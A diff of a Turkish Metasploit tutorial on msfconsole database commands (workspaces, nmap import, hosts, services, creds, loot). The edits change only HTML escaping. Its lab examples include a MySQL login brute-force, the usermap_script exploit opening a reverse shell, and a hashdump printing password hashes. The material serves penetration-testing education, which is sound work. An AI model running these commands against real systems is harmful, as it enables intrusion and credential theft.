@@ -62,7 +62,7 @@ msfconsole başladığında öncelikle `db_status` komutuyla veri tabanı bağla
 
 
 ```bash
-msf **&gt;** db_status 
+msf **>** db_status 
 **[*********]** postgresql connected to msf
 ```
 
@@ -80,14 +80,14 @@ Basitçe hiçbir parametre vermeden `workspace` komutunu verdiğinizde, mevcut k
 
 
 ```bash
-msf **&gt;** workspace
+msf **>** workspace
 ***** default
   msfu
   lab1
   lab2
   lab3
   lab4
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -104,9 +104,9 @@ Yeni bir Worksace oluşturmak için `-a` parametresi, silme için ise `-d` param
 
 
 ```bash
-msf **&gt;** workspace -a lab4
+msf **>** workspace -a lab4
 **[*********]** Added workspace: lab4
-msf **&gt;** 
+msf **>** 
 ```
 
 
@@ -115,9 +115,9 @@ msf **&gt;**
 
 
 ```bash
-msf **&gt;** workspace -d lab4 
+msf **>** workspace -d lab4 
 **[*********]** Deleted workspace: lab4
-msf **&gt;** workspace
+msf **>** workspace
 ```
 
 
@@ -130,16 +130,16 @@ msf **&gt;** workspace
 
 
 ```bash
-msf **&gt;** workspace msfu
+msf **>** workspace msfu
 **[*********]** Workspace: msfu
-msf **&gt;** workspace
+msf **>** workspace
   default
 ***** msfu
   lab1
   lab2
   lab3
   lab4
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -152,7 +152,7 @@ Detaylı yardım için `-h` parametresini kullanabilirsiniz.
 
 
 ```bash
-msf **&gt;** workspace -h
+msf **>** workspace -h
 Usage:
     workspace                  List workspaces
     workspace -v               List workspaces verbosely
@@ -163,7 +163,7 @@ Usage:
     workspace -r     Rename workspace
     workspace -h               Show this help information
 
-msf **&gt;** 
+msf **>** 
 ```
 
 
@@ -176,7 +176,7 @@ Artık yapacağınız taramalarda elde edeceğiniz sonuçlar aktif olan workspac
 
 
 ```bash
-msf **&gt;** help
+msf **>** help
 ...snip...
 
 Database Backend Commands
@@ -222,12 +222,12 @@ Aşağıdaki örnekte, `/root/msfu/nmapScan` isimli dosya, msfconsole içerisine
 
 
 ```bash
-msf **&gt;**  db_import /root/msfu/nmapScan 
+msf **>**  db_import /root/msfu/nmapScan 
 **[*********]** Importing 'Nmap XML' data
 **[*********]** Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
 **[*********]** Importing host 172.16.194.172
 **[*********]** Successfully imported /root/msfu/nmapScan
-msf **&gt;** hosts
+msf **>** hosts
 
 Hosts
 **=====**
@@ -236,7 +236,7 @@ address         mac                name  os_name  os_flavor  os_sp  purpose  inf
 -------         ---                ----  -------  ---------  -----  -------  ----  --------
 172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server         
 
-msf **&gt;** 
+msf **>** 
 ```
 
 
@@ -249,7 +249,7 @@ nmap tarama sonuçlarını dışarıdan içeri aktarabileceğiniz gibi `msfconso
 
 
 ```bash
-msf **&gt;** db_nmap -A 172.16.194.134
+msf **>** db_nmap -A 172.16.194.134
 **[*********]** Nmap: Starting Nmap 5.51SVN **(** <a href="http://nmap.org/">http://nmap.org</a> **)** at 2012-06-18 12:36 EDT
 **[*********]** Nmap: Nmap scan report **for **172.16.194.134
 **[*********]** Nmap: Host is up **(**0.00031s latency**)**.
@@ -263,10 +263,10 @@ msf **&gt;** db_nmap -A 172.16.194.134
 **[*********]** Nmap: 1   0.31 ms 172.16.194.134
 **[*********]** Nmap: OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
 **[*********]** Nmap: Nmap **done**: 1 IP address **(**1 host up**)** scanned **in **14.91 seconds
-msf **&gt;**
+msf **>**
 
 
-msf **&gt;** hosts
+msf **>** hosts
 
 Hosts
 **=====**
@@ -276,7 +276,7 @@ address         mac                name  os_name            os_flavor  os_sp  pu
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         
 
-msf **&gt;** 
+msf **>** 
 ```
 
 
@@ -293,7 +293,7 @@ msf **&gt;**
 
 
 ```bash
-msf **&gt;**  db_export -h
+msf **>**  db_export -h
 Usage:
     db_export -f  **[**-a**]** **[**filename]
     Format can be one of: xml, pwdump
@@ -306,18 +306,18 @@ Usage:
 
 
 ```bash
-msf **&gt;** db_export -f xml /root/msfu/Exported.xml
+msf **>** db_export -f xml /root/msfu/Exported.xml
 **[*********]** Starting export of workspace msfu to /root/msfu/Exported.xml **[** xml **]**...
-**[*********]**     **&gt;&gt;** Starting export of report
-**[*********]**     **&gt;&gt;** Starting export of hosts
-**[*********]**     **&gt;&gt;** Starting export of events
-**[*********]**     **&gt;&gt;** Starting export of services
-**[*********]**     **&gt;&gt;** Starting export of credentials
-**[*********]**     **&gt;&gt;** Starting export of web sites
-**[*********]**     **&gt;&gt;** Starting export of web pages
-**[*********]**     **&gt;&gt;** Starting export of web forms
-**[*********]**     **&gt;&gt;** Starting export of web vulns
-**[*********]**     **&gt;&gt;** Finished export of report
+**[*********]**     **>>** Starting export of report
+**[*********]**     **>>** Starting export of hosts
+**[*********]**     **>>** Starting export of events
+**[*********]**     **>>** Starting export of services
+**[*********]**     **>>** Starting export of credentials
+**[*********]**     **>>** Starting export of web sites
+**[*********]**     **>>** Starting export of web pages
+**[*********]**     **>>** Starting export of web forms
+**[*********]**     **>>** Starting export of web vulns
+**[*********]**     **>>** Finished export of report
 **[*********]** Finished export of workspace msfu to /root/msfu/Exported.xml **[** xml **]**...
 ```
 
@@ -331,7 +331,7 @@ msf **&gt;** db_export -f xml /root/msfu/Exported.xml
 
 
 ```bash
-msf **&gt;** hosts -h
+msf **>** hosts -h
 Usage: hosts **[** options **]** **[**addr1 addr2 ...]
 
 OPTIONS:
@@ -368,7 +368,7 @@ OPTIONS:
 
 
 ```bash
-msf **&gt;** hosts -c address,os_flavor
+msf **>** hosts -c address,os_flavor
 
 Hosts
 **=====**
@@ -389,7 +389,7 @@ Yaptığımız taramalarda elde edilen bilgilerin tutulduğu hosts listesinden b
 
 
 ```bash
-msf **&gt;** hosts -c address,os_flavor -S Linux
+msf **>** hosts -c address,os_flavor -S Linux
 
 Hosts
 **=====**
@@ -398,7 +398,7 @@ address         os_flavor
 -------         ---------
 172.16.194.172  Ubuntu
 
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -407,7 +407,7 @@ msf **&gt;**
 
 
 ```bash
-msf  auxiliary**(**tcp**)** **&gt;** show options
+msf  auxiliary**(**tcp**)** **>** show options
 
 Module options **(**auxiliary/scanner/portscan/tcp**)**:
 
@@ -434,7 +434,7 @@ Bu durumda `hosts -c address,os_flavor -S Linux` komutuyla yaptığımız arama 
 
 
 ```bash
-msf  auxiliary**(**tcp**)** **&gt;** hosts -c address,os_flavor -S Linux -R
+msf  auxiliary**(**tcp**)** **>** hosts -c address,os_flavor -S Linux -R
 
 Hosts
 **=====**
@@ -443,9 +443,9 @@ address         os_flavor
 -------         ---------
 172.16.194.172  Ubuntu
 
-RHOSTS **=&gt;** 172.16.194.172
+RHOSTS **=>** 172.16.194.172
 
-msf  auxiliary**(**tcp**)** **&gt;** run
+msf  auxiliary**(**tcp**)** **>** run
 
 **[*********]** 172.16.194.172:25 - TCP OPEN
 **[*********]** 172.16.194.172:23 - TCP OPEN
@@ -474,7 +474,7 @@ hosts listesinde arama ile filtre yapmadan, mevcut bulunan tüm IP adreslerini d
 
 
 ```bash
-msf  auxiliary**(**tcp**)** **&gt;** hosts -R
+msf  auxiliary**(**tcp**)** **>** hosts -R
 
 Hosts
 **=====**
@@ -484,9 +484,9 @@ address         mac                name  os_name            os_flavor  os_sp  pu
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         
 
-RHOSTS **=&gt;** 172.16.194.134 172.16.194.172
+RHOSTS **=>** 172.16.194.134 172.16.194.172
 
-msf  auxiliary**(**tcp**)** **&gt;** show options
+msf  auxiliary**(**tcp**)** **>** show options
 
 Module options **(**auxiliary/scanner/portscan/tcp**)**:
 
@@ -525,9 +525,9 @@ Yukarıda gördüğünüz gibi tüm IP adresleri RHOSTS içine aktarılmıştır
 
 
 ```bash
-msf **&gt;** services -h
+msf **>** services -h
 
-Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p **&gt;**port1,port2&gt;] **[**-s **&gt;**name1,name2&gt;] **[**-o **]** **[**addr1 addr2 ...]
+Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p **>**port1,port2>] **[**-s **>**name1,name2>] **[**-o **]** **[**addr1 addr2 ...]
 
   -a,--add          Add the services instead of searching
   -d,--delete       Delete the services instead of searching
@@ -560,7 +560,7 @@ Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p **&
 
 
 ```bash
-msf **&gt;** services -c name,info 172.16.194.134
+msf **>** services -c name,info 172.16.194.134
 
 Services
 **========**
@@ -581,7 +581,7 @@ host            name          info
 
 
 ```bash
-msf **&gt;** services -c name,info -S http
+msf **>** services -c name,info -S http
 
 Services
 **========**
@@ -600,7 +600,7 @@ host            name  info
 
 
 ```bash
-msf **&gt;** services -c info,name -p 445
+msf **>** services -c info,name -p 445
 
 Services
 **========**
@@ -617,7 +617,7 @@ host            info                                  name
 
 
 ```bash
-msf **&gt;** services -c port,proto,state -p 70-81
+msf **>** services -c port,proto,state -p 70-81
 Services
 **========**
 host           port proto state
@@ -647,7 +647,7 @@ Yukarıda bir kaç örnekte `-S` büyük S ile belli bir ifadeyi aramıştık. `
 
 
 ```bash
-msf **&gt;** services -s http -c port 172.16.194.134
+msf **>** services -s http -c port 172.16.194.134
 Services
 **========**
 host           port
@@ -662,7 +662,7 @@ host           port
 
 
 ```bash
-msf **&gt;** services -S Unr
+msf **>** services -S Unr
 
 Services
 **========**
@@ -682,20 +682,20 @@ Hem `hosts` hem de `services` listelerinde kayıtlı bulunan bilgilerde yaptığ
 
 
 ```bash
-msf **&gt;** services -s http -c port 172.16.194.134 -o /root/msfu/http.csv
+msf **>** services -s http -c port 172.16.194.134 -o /root/msfu/http.csv
 
 **[*********]** Wrote services to /root/msfu/http.csv
 
-msf **&gt;** hosts -S Linux -o /root/msfu/linux.csv
+msf **>** hosts -S Linux -o /root/msfu/linux.csv
 **[*********]** Wrote hosts to /root/msfu/linux.csv
 
-msf **&gt;** cat /root/msfu/linux.csv
+msf **>** cat /root/msfu/linux.csv
 **[*********]** exec: cat /root/msfu/linux.csv
 
 address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
 "172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""
 
-msf **&gt;** cat /root/msfu/http.csv
+msf **>** cat /root/msfu/http.csv
 **[*********]** exec: cat /root/msfu/http.csv
 
 host,port
@@ -713,7 +713,7 @@ host,port
 
 
 ```bash
-msf **&gt;** creds
+msf **>** creds
 
 Credentials
 **===========**
@@ -730,7 +730,7 @@ host  port  user  pass  type  active?
 
 
 ```bash
-msf  auxiliary**(**mysql_login**)** **&gt;** run
+msf  auxiliary**(**mysql_login**)** **>** run
 
 **[*********]** 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
 **[*********]** 172.16.194.172:3306 MYSQL - **[**1/2] - Trying username:'root' with password:''
@@ -739,7 +739,7 @@ msf  auxiliary**(**mysql_login**)** **&gt;** run
 **[*********]** Auxiliary module execution completed
 
 
-msf  auxiliary**(**mysql_login**)** **&gt;** creds 
+msf  auxiliary**(**mysql_login**)** **>** creds 
 
 Credentials
 **===========**
@@ -749,7 +749,7 @@ host            port  user  pass  type      active?
 172.16.194.172  3306  root        password  true
 
 **[*********]** Found 1 credential.
-msf  auxiliary**(**mysql_login**)** **&gt;**
+msf  auxiliary**(**mysql_login**)** **>**
 ```
 
 
@@ -762,10 +762,10 @@ Bir sistemde oturum açtığınızda, modül kullanmadan kendiniz bulduğunuz ku
 
 
 ```bash
-msf **&gt;** creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+msf **>** creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
 **[*********]** Time: 2012-06-20 20:31:42 UTC Credential: host**=**172.16.194.134 port**=**445 proto**=**tcp sname**=** type**=**password user**=**Administrator pass**=**7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active**=**true
 
-msf **&gt;** creds
+msf **>** creds
 
 Credentials
 **===========**
@@ -787,7 +787,7 @@ Oturum açılan bir sistemde, genellikle ilk olarak `hashdump` yapılarak hash t
 
 
 ```bash
-msf **&gt;** loot -h
+msf **>** loot -h
 Usage: loot 
  Info: loot **[**-h**]** **[**addr1 addr2 ...] **[**-t **]**
   Add: loot -f **[**fname] -i **[**info] -a **[**addr1 addr2 ...] **[**-t **[**type**]**
@@ -808,7 +808,7 @@ Ardından **usermap_script** modülü kullanılarak karşı sistemde oturum aç�
 
 
 ```bash
-msf  exploit**(**usermap_script**)** **&gt;** exploit
+msf  exploit**(**usermap_script**)** **>** exploit
 
 **[*********]** Started reverse double handler
 **[*********]** Accepted the first client connection...
@@ -821,13 +821,13 @@ msf  exploit**(**usermap_script**)** **&gt;** exploit
 **[*********]** B: "4uGPYOrars5OojdL\r "
 **[*********]** Matching...
 **[*********]** A is input...
-**[*********]** Command shell session 1 opened **(**172.16.194.163:4444 -&gt; 172.16.194.172:55138**)** at 2012-06-27 19:38:54 -0400
+**[*********]** Command shell session 1 opened **(**172.16.194.163:4444 -> 172.16.194.172:55138**)** at 2012-06-27 19:38:54 -0400
 
 ^Z
 Background session 1? **[**y/N]  y
 
-msf  exploit**(**usermap_script**)** **&gt;** use post/linux/gather/hashdump
-msf  post**(**hashdump**)** **&gt;** show options
+msf  exploit**(**usermap_script**)** **>** use post/linux/gather/hashdump
+msf  post**(**hashdump**)** **>** show options
 
 Module options **(**post/linux/gather/hashdump**)**:
 
@@ -835,16 +835,16 @@ Module options **(**post/linux/gather/hashdump**)**:
    ----     ---------------  --------  -----------
    SESSION  1                yes       The session to run this module on.
 
-msf  post**(**hashdump**)** **&gt;** sessions -l
+msf  post**(**hashdump**)** **>** sessions -l
 
 Active sessions
 **===============**
 
   Id  Type        Information  Connection
   --  ----        -----------  ----------
-  1   shell unix               172.16.194.163:4444 -&gt; 172.16.194.172:55138 **(**172.16.194.172**)**
+  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 **(**172.16.194.172**)**
 
-msf  post**(**hashdump**)** **&gt;** run
+msf  post**(**hashdump**)** **>** run
 
 **[**+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
 **[**+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
@@ -863,7 +863,7 @@ Veri tabanında kayıtlı hash değerlerini görmek için `loot` komutunu vermen
 
 
 ```bash
-msf  post**(**hashdump**)** **&gt;** loot
+msf  post**(**hashdump**)** **>** loot
 
 Loot
 **====**
